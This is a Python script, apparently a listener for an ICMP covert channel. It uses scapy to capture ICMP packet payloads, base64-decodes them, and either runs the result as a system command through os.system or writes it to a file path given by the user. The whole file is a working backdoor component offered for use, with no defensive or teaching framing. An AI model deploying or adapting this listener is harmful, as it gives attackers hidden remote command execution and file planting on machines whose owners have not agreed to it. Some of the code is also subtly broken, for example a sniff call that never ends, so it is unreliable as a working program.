#! /usr/bin/env python3
from scapy.all import *
import base64
import argparse
import sys, traceback
import os


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-mode", "--mode", required=True, help="Mode: 1=command or 2=file")
    parser.add_argument("-path", "--path", required=False, help="Destination file path (if mode = 2)")

    args = parser.parse_args()

    received_file = args.path
    mode = args.mode

    print("Listening...")

    received_content = bytearray()

    rx = sniff(filter="icmp")
    for packet in rx:
        received_payload = packet[Raw]
        received_chunk = bytes(received_payload)
        print(received_chunk)
        received_content += received_chunk

    received_decoded = base64.b64decode(received_content)
    
    if mode == '1':
        os.system(received_decoded)
    elif mode == '2':
        try:
            with open(received_file, "w") as file:
                file.write(received_decoded)
        except:
            print('IO Exception:\n')
            traceback.print_exc(file=sys.stdout)
    else:
        print("Mode not supported, wrong input")

main()
